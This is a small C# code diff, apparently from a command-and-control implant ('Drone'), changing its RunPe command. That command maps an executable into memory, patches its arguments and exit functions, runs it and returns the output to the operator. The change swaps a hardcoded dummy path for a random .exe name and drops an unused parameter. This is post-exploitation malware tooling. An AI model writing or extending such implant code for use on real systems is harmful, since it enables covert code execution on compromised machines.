@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -28,7 +29,9 @@ public class RunPe : DroneCommand
         peMapper.SetPagePermissions();
         
         var argumentHandler = new ArgumentHandler();
-        if (!argumentHandler.UpdateArgs("C:\\something\\random.exe", task.Arguments))
+        var filePath = $"{Directory.GetCurrentDirectory()}\\{Helpers.GenerateRandomString(7)}.exe";
+        
+        if (!argumentHandler.UpdateArgs(filePath, task.Arguments))
         {
             await Drone.SendTaskError(task.Id, "Failed to patch arguments");
             return;
@@ -60,7 +63,7 @@ public class RunPe : DroneCommand
         
         fileDescriptorRedirector.StartReadFromPipe();
         
-        StartExecution(task.Arguments, pe, currentBase);
+        StartExecution(pe, currentBase);
         
         // Revert changes
         exitPatcher.ResetExitFunctions();
@@ -76,7 +79,7 @@ public class RunPe : DroneCommand
         await Drone.SendTaskOutput(task.Id, output);
     }
     
-    private static void StartExecution(string[] binaryArgs, PELoader pe, long currentBase)
+    private static void StartExecution(PELoader pe, long currentBase)
     {
         try
         {
@@ -91,7 +94,7 @@ public class RunPe : DroneCommand
 
             Methods.WaitForSingleObject(hThread, 30000);
         }
-        catch (Exception e)
+        catch
         {
             // bit pointless as this is usually fatal
         }
